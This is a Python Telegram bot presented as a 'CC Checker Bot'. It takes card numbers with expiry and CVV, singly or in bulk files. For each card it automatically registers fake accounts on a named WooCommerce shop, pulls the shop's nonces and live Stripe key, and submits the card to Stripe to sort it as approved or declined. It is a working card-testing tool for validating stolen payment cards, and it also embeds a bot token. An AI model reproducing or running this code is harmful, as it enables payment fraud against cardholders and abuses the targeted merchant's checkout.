import requests
import json
import random
import re
import os
import time
from datetime import datetime
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackQueryHandler, Filters, CallbackContext

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = "8787030321:AAHiOJsh0s3escHhuKPr5-K2W78ORh9uJ5c"

# Statistics
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0,
    'start_time': datetime.now()
}

# Global variables
processing_cards = []
processing_status = {}
current_message_id = None
current_chat_id = None

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def check_cc(fullz):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        
        email = f"user{random.randint(100000, 999999)}@gmail.com"
        user = f"user{random.randint(100000, 999999)}"

        s = requests.Session()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers)
        
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
        
        if not nonce:
            return "DECLINED ❌ - Failed to get nonce"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image.webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u-0, i',
            'referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers)
        
        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
        
        if not pnonce:
            return "DECLINED ❌ - Failed to get payment nonce"

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        if response.status_code != 200:
            return f"DECLINED ❌ - Stripe Error: {response.status_code}"

        try:
            payment_id = response.json()['id']
        except:
            return "DECLINED ❌ - Failed to get payment ID"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=1, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }

        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return "APPROVED ✅"
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return f"DECLINED ❌ - {error_msg}"
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return "DECLINED ❌ - Nonce failed"
                elif 'error' in response.text.lower():
                    return f"DECLINED ❌ - {response.text}"
                else:
                    return f"UNKNOWN ⚠️ - {response.text}"
        else:
            return f"HTTP Error: {response.status_code}"

    except Exception as e:
        return f"ERROR ⚠️ - {str(e)}"

def start(update, context):
    keyboard = [
        [
            InlineKeyboardButton("📊 Check CC", callback_data="check_cc"),
            InlineKeyboardButton("📈 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("📁 Check File", callback_data="check_file"),
            InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "✨ *Welcome to CC Checker Bot!* ✨\n\n"
        "🔍 *I can help you validate credit cards*\n"
        "📌 *Send me cards in this format:*\n"
        "`5121078835045021|12|2041|111`\n\n"
        "📂 *Or send a .txt file with multiple cards*\n"
        "⚡ *Use /chk to start checking*\n\n"
        "🛠 *Choose an option below:*"
    )
    
    update.message.reply_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def button_handler(update, context):
    query = update.callback_query
    query.answer()
    
    if query.data == "check_cc":
        query.edit_message_text(
            "📝 *Please send me the CC details*\n\n"
            "Format: `5121078835045021|12|2041|111`\n"
            "You can send multiple cards, one per line.\n\n"
            "_Send /cancel to stop_",
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_cc'] = True
        
    elif query.data == "check_file":
        query.edit_message_text(
            "📂 *Please send me a .txt file*\n"
            "The file should contain one card per line.\n\n"
            "Format: `5121078835045021|12|2041|111`\n\n"
            "_Send /cancel to stop_",
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_file'] = True
        
    elif query.data == "stats":
        show_stats(update, context)
        
    elif query.data == "reset_stats":
        reset_stats(update, context)
        
    elif query.data == "help":
        show_help(update, context)

def show_stats(update, context):
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    stats_text = (
        "📊 *━━━━━━ STATISTICS ━━━━━━* 📊\n\n"
        f"🕐 *Uptime:* `{hours}h {minutes}m`\n"
        f"📊 *Total Checked:* `{stats['total']}`\n\n"
        f"✅ *Approved:* `{stats['approved']}`\n"
        f"❌ *Declined:* `{stats['declined']}`\n"
        f"⚠️ *Unknown:* `{stats['unknown']}`\n"
        f"🚫 *Errors:* `{stats['errors']}`\n\n"
        f"📈 *Success Rate:* `{stats['approved']/stats['total']*100:.1f}%`" if stats['total'] > 0 else "📈 *Success Rate:* `0%`"
    )
    
    keyboard = [[InlineKeyboardButton("🔄 Refresh Stats", callback_data="stats")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        update.callback_query.edit_message_text(
            stats_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        update.message.reply_text(
            stats_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

def reset_stats(update, context):
    global stats
    stats = {
        'total': 0,
        'approved': 0,
        'declined': 0,
        'unknown': 0,
        'errors': 0,
        'start_time': datetime.now()
    }
    
    update.callback_query.edit_message_text(
        "🔄 *Statistics have been reset!* ✅\n\n"
        "All counters are now at 0.",
        parse_mode='Markdown'
    )

def show_help(update, context):
    help_text = (
        "❓ *━━━━━━ HELP ━━━━━━* ❓\n\n"
        "🤖 *Bot Commands:*\n"
        "• `/start` - Welcome message\n"
        "• `/chk` - Start checking CCs\n"
        "• `/stats` - Show statistics\n"
        "• `/reset` - Reset statistics\n\n"
        "📝 *CC Format:*\n"
        "`5121078835045021|12|2041|111`\n"
        "*(card|month|year|cvv)*\n\n"
        "📂 *File Support:*\n"
        "Send a .txt file with cards\n"
        "One card per line\n\n"
        "⚡ *Tips:*\n"
        "• Use inline buttons for quick actions\n"
        "• Check stats to track your progress\n"
        "• Send /cancel to stop any operation"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        update.callback_query.edit_message_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        update.message.reply_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

def back_to_menu(update, context):
    query = update.callback_query
    query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("📊 Check CC", callback_data="check_cc"),
            InlineKeyboardButton("📈 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("📁 Check File", callback_data="check_file"),
            InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    query.edit_message_text(
        "✨ *Welcome to CC Checker Bot!* ✨\n\n"
        "🔍 *I can help you validate credit cards*\n"
        "📌 *Send me cards in this format:*\n"
        "`5121078835045021|12|2041|111`\n\n"
        "📂 *Or send a .txt file with multiple cards*\n"
        "⚡ *Use /chk to start checking*\n\n"
        "🛠 *Choose an option below:*",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def handle_message(update, context):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    if update.message.text and update.message.text.lower() == '/cancel':
        context.user_data.clear()
        update.message.reply_text(
            "❌ *Operation cancelled!*\n"
            "Use /start to begin again.",
            parse_mode='Markdown'
        )
        return
    
    if context.user_data.get('waiting_for_cc'):
        text = update.message.text.strip()
        lines = text.split('\n')
        valid_cards = []
        
        for line in lines:
            if line.strip():
                if '|' in line and len(line.split('|')) == 4:
                    valid_cards.append(line.strip())
                else:
                    update.message.reply_text(
                        f"❌ *Invalid format:* `{line}`\n"
                        f"Please use: `5121078835045021|12|2041|111`",
                        parse_mode='Markdown'
                    )
                    return
        
        if valid_cards:
            context.user_data['waiting_for_cc'] = False
            process_cards(update, context, valid_cards)
        else:
            update.message.reply_text(
                "❌ *No valid cards found!*\n"
                "Please send cards in the correct format.",
                parse_mode='Markdown'
            )
        return
    
    if context.user_data.get('waiting_for_file'):
        if update.message.document:
            file = update.message.document.get_file()
            file_content = file.download_as_bytearray()
            text = file_content.decode('utf-8')
            lines = text.split('\n')
            valid_cards = []
            
            for line in lines:
                if line.strip():
                    if '|' in line and len(line.split('|')) == 4:
                        valid_cards.append(line.strip())
            
            if valid_cards:
                context.user_data['waiting_for_file'] = False
                process_cards(update, context, valid_cards)
            else:
                update.message.reply_text(
                    "❌ *No valid cards found in file!*\n"
                    "Each line should be in format: `5121078835045021|12|2041|111`",
                    parse_mode='Markdown'
                )
        else:
            update.message.reply_text(
                "❌ *Please send a text file!*\n"
                "Use /cancel to stop.",
                parse_mode='Markdown'
            )
        return
    
    if update.message.text and update.message.text.startswith('/chk'):
        start_check(update, context)
        return

    if update.message.text and not update.message.text.startswith('/'):
        update.message.reply_text(
            "❓ *Unknown command or format*\n\n"
            "Use /start to see available options\n"
            "Or send cards in format:\n"
            "`5121078835045021|12|2041|111`",
            parse_mode='Markdown'
        )

def start_check(update, context):
    keyboard = [
        [
            InlineKeyboardButton("📝 Enter Cards", callback_data="check_cc"),
            InlineKeyboardButton("📁 Upload File", callback_data="check_file")
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(
        "🔍 *Start CC Checking*\n\n"
        "Choose how you want to provide the cards:\n\n"
        "📝 *Option 1:* Enter cards manually\n"
        "📁 *Option 2:* Upload a .txt file\n\n"
        "_Each card should be in format:_\n"
        "`5121078835045021|12|2041|111`",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def process_cards(update, context, cards):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    processing_cards = cards
    processing_status = {}
    current_chat_id = update.effective_chat.id
    
    progress_text = (
        "🔄 *Processing Cards*\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n\n"
        f"📊 *Total:* `{len(cards)}`\n"
        f"✅ *Approved:* `0`\n"
        f"❌ *Declined:* `0`\n"
        f"⚠️ *Unknown:* `0`\n"
        f"🚫 *Errors:* `0`\n\n"
        "⏳ *Processing...*"
    )
    
    msg = update.message.reply_text(
        progress_text,
        parse_mode='Markdown'
    )
    current_message_id = msg.message_id
    
    for i, card in enumerate(cards, 1):
        result = check_cc(card)
        processing_status[card] = result
        
        stats['total'] += 1
        if 'APPROVED' in result:
            stats['approved'] += 1
        elif 'DECLINED' in result:
            stats['declined'] += 1
        elif 'ERROR' in result or 'HTTP' in result:
            stats['errors'] += 1
        else:
            stats['unknown'] += 1
        
        progress = int((i / len(cards)) * 10)
        bar = "▰" * progress + "▱" * (10 - progress)
        percentage = int((i / len(cards)) * 100)
        
        progress_text = (
            f"🔄 *Processing Cards*\n\n"
            f"{bar} {percentage}%\n\n"
            f"📊 *Total:* `{len(cards)}`\n"
            f"✅ *Approved:* `{stats['approved']}`\n"
            f"❌ *Declined:* `{stats['declined']}`\n"
            f"⚠️ *Unknown:* `{stats['unknown']}`\n"
            f"🚫 *Errors:* `{stats['errors']}`\n\n"
            f"⏳ *Processing...* `{i}/{len(cards)}`"
        )
        
        try:
            context.bot.edit_message_text(
                progress_text,
                chat_id=current_chat_id,
                message_id=current_message_id,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Error updating progress: {e}")
        
        time.sleep(0.1)
    
    show_results(update, context)

def show_results(update, context):
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    approved = []
    declined = []
    unknown = []
    errors = []
    
    for card, result in processing_status.items():
        if 'APPROVED' in result:
            approved.append((card, result))
        elif 'DECLINED' in result:
            declined.append((card, result))
        elif 'ERROR' in result or 'HTTP' in result:
            errors.append((card, result))
        else:
            unknown.append((card, result))
    
    results_text = (
        "✅ *━━━━━━ RESULTS ━━━━━━* ✅\n\n"
        f"📊 *Total:* `{len(processing_cards)}`\n"
        f"✅ *Approved:* `{len(approved)}`\n"
        f"❌ *Declined:* `{len(declined)}`\n"
        f"⚠️ *Unknown:* `{len(unknown)}`\n"
        f"🚫 *Errors:* `{len(errors)}`\n\n"
    )
    
    if approved:
        results_text += "✅ *APPROVED CARDS:*\n"
        for card, result in approved[:10]:
            results_text += f"• `{card}` - {result}\n"
        if len(approved) > 10:
            results_text += f"_...and {len(approved)-10} more_\n"
        results_text += "\n"
    
    if declined:
        results_text += "❌ *DECLINED CARDS:*\n"
        for card, result in declined[:5]:
            results_text += f"• `{card}` - {result}\n"
        if len(declined) > 5:
            results_text += f"_...and {len(declined)-5} more_\n"
        results_text += "\n"
    
    keyboard = [
        [
            InlineKeyboardButton("📊 Check More", callback_data="check_cc"),
            InlineKeyboardButton("📈 Full Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        context.bot.edit_message_text(
            results_text,
            chat_id=current_chat_id,
            message_id=current_message_id,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error showing results: {e}")
        context.bot.send_message(
            chat_id=current_chat_id,
            text=results_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    processing_cards = []
    processing_status = {}
    current_message_id = None
    current_chat_id = None

def error_handler(update, context):
    logger.warning(f"Update {update} caused error {context.error}")

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("chk", start_check))
    dp.add_handler(CommandHandler("stats", show_stats))
    dp.add_handler(CommandHandler("reset", reset_stats))
    dp.add_handler(CommandHandler("cancel", handle_message))
    dp.add_handler(CommandHandler("help", show_help))
    
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    dp.add_handler(MessageHandler(Filters.text | Filters.document, handle_message))
    
    dp.add_error_handler(error_handler)
    
    print("🤖 Bot started! Press Ctrl+C to stop.")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
